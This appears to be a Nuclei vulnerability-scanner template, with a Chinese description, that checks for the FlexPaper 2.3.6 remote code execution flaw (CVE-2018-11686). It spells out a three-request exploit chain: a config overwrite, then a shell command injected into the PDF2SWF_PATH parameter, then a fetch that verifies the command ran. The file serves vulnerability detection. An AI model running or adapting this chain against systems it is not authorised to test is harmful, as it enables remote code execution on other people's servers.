id: CVE-2018-11686
info:
  name: FlexPaper <= 2.3.6 RCE远程代码执行漏洞
  author:
  - l0ne1y
  description: |-
    FlexPaper <= 2.3.6 RCE远程代码执行漏洞
    Devaldi FlexPaper是新西兰Devaldi公司的一款基于Web的轻量级PDF文件查看组件。

    Devaldi FlexPaper 2.3.6及之前版中存在安全漏洞。远程攻击者可利用该漏洞执行代码。
  severity: critical
  remediation: |-
    **官方修复方案**
    使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：
    https://flowpaper.com/
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - status_code_1==200 || status_code_1==302
    - status_code_2==200
    - contains(body_3,"{{verify}}%{{verify}}")
  raw:
  - |
    POST /php/change_config.php HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    SAVE_CONFIG=1&PDF_Directory=a&SWF_Directory=config/&LICENSEKEY=a&SPLITMODE=a&RenderingOrder_PRIM=a&RenderingOrder_SEC=a
  - |
    GET /php/setup.php?step=2&PDF2SWF_PATH=printf%20{{verify}}%25%25{{verify}}%20%3e%20{{fileName}} HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
  - "GET /php/{{fileName}}pdf2swf HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded
    \n"
variables:
  fileName: '{{rand_text_alphanumeric(6,"")}}'
  verify: '{{rand_text_alphanumeric(8,"")}}'
